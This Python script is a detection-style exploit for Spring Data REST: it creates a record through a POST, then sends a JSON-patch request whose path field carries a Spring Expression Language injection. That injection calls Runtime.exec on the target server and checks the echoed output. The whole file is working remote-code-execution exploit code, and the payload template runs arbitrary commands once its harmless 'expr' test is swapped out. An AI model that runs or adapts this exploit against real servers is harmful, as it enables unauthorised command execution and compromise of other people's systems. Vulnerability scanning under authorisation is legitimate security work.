import requests,re,urllib3
from urllib import parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def url_encoding(string):
    return parse.quote(string)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
firstName=randomLowercase(4)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
lastName=randomLowercase(4)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand1=randomInt(200000000, 210000000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand2=randomInt(200000000, 210000000)
payload= url_encoding("java.lang.Runtime.getRuntime().exec(\"expr " + str(rand1) + " + " + str(rand2) + "\").getInputStream()")
def scan(baseurl):
	path_list=['customers','people','persons','users']
	flag=[]
	for path in path_list:
		try:
			if baseurl[-1]=="/":
				baseurl=baseurl
			else:
				baseurl=baseurl+"/"
			url=baseurl+path
			body='{"firstName":"'+firstName+'","lastName":"'+lastName+'"}'
			headers={'Accept': 'application/hal+json', 'Content-Type': 'application/json-patch+json'}
			response=requests.post(url,body,headers=headers,timeout=5,verify=False)
			if response.status_code == 201:
				r1=True
				try:
					personNum=re.findall("customers\\/(\\d+)",response.text)[0]
				except:
					personNum=''
			else:
				personNum=''
				r1=False
			if baseurl[-1]=="/":
				baseurl=baseurl
			else:
				baseurl=baseurl+"/"
			url=baseurl+f"{path}/{personNum}"
			body='[{ "op": "replace", "path": "T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\'JavaScript\').eval(T(java.net.URLDecoder).decode(\''+payload+'\')),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/'+lastName+'", "value": "changed" }]'
			headers={'Content-Type': 'application/json-patch+json'}
			response=requests.patch(url,body,headers=headers,timeout=5,verify=False)
			if response.status_code == 200 and str(rand1 + rand2) in response.text:
				r2=True
			else:
				r2=False
			if r1 and r2:
				flag.append(1)
				break
		except:
			pass
	if len(flag)>0:
		return True
	else:
		return False
			
